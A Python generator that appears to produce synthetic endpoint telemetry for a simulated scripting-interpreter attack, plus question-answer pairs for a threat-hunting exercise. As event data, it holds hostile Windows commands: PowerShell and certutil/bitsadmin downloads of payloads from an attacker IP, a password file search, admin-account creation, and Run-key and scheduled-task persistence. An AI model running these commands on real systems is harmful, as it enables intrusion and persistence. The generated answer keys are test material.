import random
from datetime import datetime, timedelta
from pathlib import Path
import polars as pl
from tqdm import tqdm
from faker import Faker

from src.utils.polars_utils import safe_concat
from ..utils import (
    generate_device_process_events,
    generate_outbound_network_events,
    generate_device_file_events
)

class CommandScriptingInterpreterAttackGenerator:
    
    def __init__(self, benign_data, victims, attacker, last_scan_time):

        self.victims = victims
        self.benign_data = benign_data
        self.fake = Faker()
        self.attacker = attacker
        self.last_scan_time = last_scan_time
        self.data = {}
        
        # PowerShell and CMD commands that simulate malicious behavior
        self.powershell_commands = [
            "powershell.exe -NoP -NonI -W Hidden -Enc [encoded_payload]",
            "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('[URL]')\"",
            "powershell.exe -Command \"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.DownloadString('[URL]')|IEX}\"",
            "powershell.exe -Command \"Get-ChildItem -Path C:\\Users\\%username%\\Documents -Recurse | Select-String -Pattern 'password' | Out-File C:\\Users\\%username%\\Desktop\\results.txt\""
        ]
        
        self.cmd_commands = [
            "cmd.exe /c whoami & ipconfig & net user & net localgroup administrators",
            "cmd.exe /c netstat -ano > C:\\Users\\%username%\\netstat.txt",
            "cmd.exe /c schtasks /create /tn \"SystemCheck\" /tr \"powershell.exe -NonI -W Hidden -c [command]\" /sc daily /st 09:00",
            "cmd.exe /c reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\Users\\%username%\\malware.exe\" /f"
        ]
        
        # Malicious script file names
        self.script_files = [
            "update.ps1", 
            "syscheck.bat", 
            "maintenance.vbs", 
            "config.js",
            "setup.cmd"
        ]
    
    def generate_command_scripting_attack(self):

        process_events = []
        network_events = []
        file_events = []

        campaign_start_time = self.fake.date_time_between(
            start_date=self.last_scan_time, end_date=datetime.today()
        )
        script_file = random.choice(self.script_files)

        compromised_victims = []
        
        for victim in tqdm(self.victims.to_dicts(), desc="Generating command & scripting interpreter events"):
            execution_time = campaign_start_time + timedelta(minutes=random.randint(5, 60))
            compromised_victims.append(victim["AccountUpn"])

            user_devices = self.benign_data["device_info"].filter(
                    pl.col("LoggedOnUsers").str.contains(victim["AccountUpn"])
                )
            user_device = user_devices.sample(n=1).to_dicts()[0]

            # Scenario 1: Script file created first, then executed
            if random.choice([True, False]):
                
                file_path = f"C:\\Users\\{victim['AccountUpn']}\\{'Downloads' if random.random() < 0.5 else 'Documents'}\\{script_file}"
                
                file_event = generate_device_file_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=execution_time,
                    fake=self.fake
                )
                
                file_event["FileName"] = script_file
                file_event["FolderPath"] = file_path
                file_event["ActionType"] = "FileCreated"
                
                file_events.append(file_event)
                # Execute script file
                script_exec_time = execution_time + timedelta(seconds=random.randint(5, 30))
                if script_file.endswith(".ps1"):
                    cmd_line = f"powershell.exe -ExecutionPolicy Bypass -File {file_path}"
                    process_name = "powershell.exe"
                elif script_file.endswith((".bat", ".cmd")):
                    cmd_line = f"cmd.exe /c {file_path}"
                    process_name = "cmd.exe"
                elif script_file.endswith(".vbs"):
                    cmd_line = f"cscript.exe {file_path}"
                    process_name = "cscript.exe"
                elif script_file.endswith(".js"):
                    cmd_line = f"wscript.exe {file_path}"
                    process_name = "wscript.exe"
                
                process_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=script_exec_time,
                    fake=self.fake,
                    file_name=process_name,
                    process_command_line=cmd_line
                )
                process_events.append(process_event)
                
            # Scenario 2: Direct PowerShell/CMD execution
            else:
                if random.random() < 0.6:
                    cmd_line = random.choice(self.powershell_commands)
                    process_name = "powershell.exe"
                else:
                    cmd_line = random.choice(self.cmd_commands)
                    process_name = "cmd.exe"
                
                process_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=execution_time,
                    fake=self.fake,
                    file_name=script_file,
                    process_command_line=cmd_line.replace("[URL]", f"http://{self.attacker['ExternalServerIP']}/payload.ps1")
                                              .replace("[encoded_payload]", self.fake.sha256())
                )
                process_events.append(process_event)
            
            if random.random() < 1.0:
                child_time = execution_time + timedelta(seconds=random.randint(2, 15))
                child_processes = ["net.exe", "sc.exe", "reg.exe", "certutil.exe", "bitsadmin.exe"]
                child_process = random.choice(child_processes)
                
                child_commands = {
                    "net.exe": "net user admin P@ssw0rd /add",
                    "sc.exe": "sc config UsoSvc binPath=\"cmd.exe /c calc.exe\"",
                    "reg.exe": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\backdoor.exe\" /f",
                    "certutil.exe": "certutil -urlcache -split -f http://[ip]/malware.exe C:\\malware.exe",
                    "bitsadmin.exe": "bitsadmin /transfer myJob /download /priority high http://[ip]/malware.exe C:\\malware.exe"
                }
                
                child_cmd = child_commands[child_process].replace("[ip]", self.attacker['ExternalServerIP'])
                
                child_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=child_time,
                    fake=self.fake,
                    file_name=child_process,
                    process_command_line=child_cmd
                )
                process_events.append(child_event)

            if random.random() < 1.0:
                callback_time = execution_time + timedelta(seconds=random.randint(10, 45))
                remote_port = random.choice([443, 8080, 4444, 445, 22])
                
                callback_event = generate_outbound_network_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=callback_time,
                    fake=self.fake,
                    remote_ip=self.attacker["ExternalServerIP"],
                    remote_url=self.attacker['ExternalServerName'],
                    remote_port=remote_port,
                )
                network_events.append(callback_event)

        data = {}
        if file_events:
            data["device_file_events"] = pl.DataFrame(file_events).sort("Timestamp")
        if process_events:
            data["device_process_events"] = pl.DataFrame(process_events).sort("Timestamp")
        if network_events:
            data["device_network_events"] = pl.DataFrame(network_events).sort("Timestamp")
        
        self.data = data
        
        all_timestamps = [ts for df in data.values() if "Timestamp" in df.columns for ts in df["Timestamp"].to_list()]
        last_event_time = max(all_timestamps) if all_timestamps else campaign_start_time
        
        compromised_victims_df = self.victims.filter(pl.col("AccountUpn").is_in(compromised_victims)) if compromised_victims else pl.DataFrame()
        
        return data, compromised_victims_df, last_event_time
    
    def generate_question_answer_pairs(self):
        
        # Combine benign and malicious events for analysis
        all_process_events = pl.concat([self.benign_data["device_process_events"], self.data.get("device_process_events", pl.DataFrame())])
        all_network_events = safe_concat([
            self.benign_data["device_network_events"].filter(pl.col("ActionType") == "OutboundConnection"), 
            self.data.get("outbound_network_events", pl.DataFrame())
        ])
        try:
            all_file_events = safe_concat([self.benign_data["device_file_events"], self.data.get("device_file_events", pl.DataFrame())])
        except: 
            all_file_events = self.data.get("device_file_events", pl.DataFrame())

        questions = []
        answers = []
        
        Q1 = "How many PowerShell executions with encoded commands (-Enc parameter) were observed?"
        Q1_answer = (
            all_process_events
            .filter(
                (pl.col("ProcessCommandLine").str.contains("-Enc")) & 
                (pl.col("FileName") == "powershell.exe")
            )
            .height
        )
        questions.append(Q1)
        answers.append(Q1_answer)
        
        Q3 = "How many devices connected to the attacker's external server after suspicious command execution?"
        Q3_answer = (
            all_network_events
            .filter(pl.col("RemoteIP") == self.attacker["ExternalServerIP"])
            .select("DeviceName")
            .unique()
            .height
        )
        questions.append(Q3)
        answers.append(Q3_answer)
        
        Q4 = "What suspicious script files were created during the attack timeframe?"
        Q4_answer = "None found"
        if not all_file_events.is_empty() and "ActionType" in all_file_events.columns and "FileName" in all_file_events.columns:
            suspicious_files = all_file_events.filter(
                (pl.col("ActionType") == "FileCreated") &
                (pl.col("FileName").str.contains("\.(ps1|bat|vbs|js|cmd)$"))
            )
            if not suspicious_files.is_empty():
                Q4_answer = ", ".join(
                    suspicious_files
                    .select("FileName")
                    .unique()
                    .to_series()
                    .to_list()
                )
        questions.append(Q4)
        answers.append(Q4_answer)
        
        Q5 = "Which accounts executed commands that modified registry run keys or scheduled tasks?"
        Q5_answer = ", ".join(
            all_process_events
            .filter(
                pl.col("ProcessCommandLine").str.contains("schtasks /create|reg add.*Run", literal=False)
            )
            .select("AccountUpn")
            .unique()
            .to_series()
            .to_list()
        )
        questions.append(Q5)
        answers.append(Q5_answer)
        
        Q6 = "What are the most common malicious child processes spawned during the attack?"
        Q6_answer = ", ".join(
            [f"{d['FileName']} ({d['count']})" for d in 
            all_process_events
            .filter(
                pl.col("FileName").is_in(["net.exe", "sc.exe", "reg.exe", "certutil.exe", "bitsadmin.exe"])
            )
            .group_by("FileName")
            .count()
            .sort("count", descending=True)
            .select(["FileName", "count"])
            .to_dicts()]
        )
        questions.append(Q6)
        answers.append(Q6_answer)
        
        qa_df = pl.DataFrame({"Question": questions, "Answer": answers}, strict=False)
        return qa_df